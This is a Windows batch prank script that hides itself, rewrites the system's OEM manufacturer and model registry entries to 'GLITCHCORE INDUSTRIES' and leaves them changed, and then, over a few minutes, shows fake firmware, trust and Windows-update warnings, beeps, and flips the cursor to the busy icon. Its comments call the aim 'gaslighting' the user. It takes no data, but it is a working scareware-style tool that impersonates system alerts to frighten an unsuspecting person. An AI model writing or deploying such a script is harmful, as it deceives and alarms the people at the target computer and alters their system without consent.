@echo off
if "%1"=="min" goto core
start "" /min "%~f0" min
exit

:core

rem === SYSTEM IDENTITY GASLIGHTING ===
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OEMInformation" /v Manufacturer /t REG_SZ /d "GLITCHCORE INDUSTRIES" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OEMInformation" /v Model /t REG_SZ /d "NODE-X13 :: UNSTABLE BRANCH" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\OEMInformation" /v SupportURL /t REG_SZ /d "https://glitchcore.local" /f >nul 2>&1

timeout /t 5 >nul

rem === FAKE FIRMWARE / BIOS DRAMA ===
powershell -windowstyle hidden -command "[System.Windows.MessageBox]::Show('Firmware checksum mismatch detected.','Firmware Alert',[System.Windows.MessageBoxButton]::OK,[System.Windows.MessageBoxImage]::Warning)" >nul 2>&1

timeout /t 12 >nul

powershell -windowstyle hidden -command "[System.Windows.MessageBox]::Show('System operating in degraded trust state.','System Notification',[System.Windows.MessageBoxButton]::OK,[System.Windows.MessageBoxImage]::Information)" >nul 2>&1

timeout /t 15 >nul

rem === RANDOM SYSTEM SOUND (NO VISUAL SOURCE) ===
powershell -windowstyle hidden -command "[console]::beep(800,300)" >nul 2>&1
timeout /t 2 >nul
powershell -windowstyle hidden -command "[console]::beep(600,200)" >nul 2>&1

timeout /t 10 >nul

rem === FAKE WINDOWS UPDATE VIBE ===
powershell -windowstyle hidden -command "[System.Windows.MessageBox]::Show('Applying background configuration changes. Please avoid shutdown.','Windows',[System.Windows.MessageBoxButton]::OK,[System.Windows.MessageBoxImage]::Information)" >nul 2>&1

timeout /t 20 >nul

rem === IRRITATING BUT HARMLESS SYSTEM MESSAGE ===
msg * /time:12 "Background realignment in progress." >nul 2>&1

timeout /t 15 >nul

rem === CURSOR SCHEME CONFUSION (VISUAL BUT SAFE) ===
reg add "HKCU\Control Panel\Cursors" /v Arrow /t REG_SZ /d "%SystemRoot%\Cursors\wait.cur" /f >nul 2>&1
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters >nul 2>&1

timeout /t 8 >nul

rem === RESTORE CURSOR (SUBCONSCIOUS GASLIGHT) ===
reg add "HKCU\Control Panel\Cursors" /v Arrow /t REG_SZ /d "%SystemRoot%\Cursors\aero_arrow.cur" /f >nul 2>&1
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters >nul 2>&1

timeout /t 10 >nul

rem === RANDOM WINDOW TITLE MIND-GAME ===
title %random%-%random%-%random%

timeout /t 5 >nul

rem === FAKE SYSTEM WARNING (FINAL BLOW) ===
powershell -windowstyle hidden -command "[System.Windows.MessageBox]::Show('Anomalous behavior normalized. Monitoring continues.','System',[System.Windows.MessageBoxButton]::OK,[System.Windows.MessageBoxImage]::Warning)" >nul 2>&1

exit
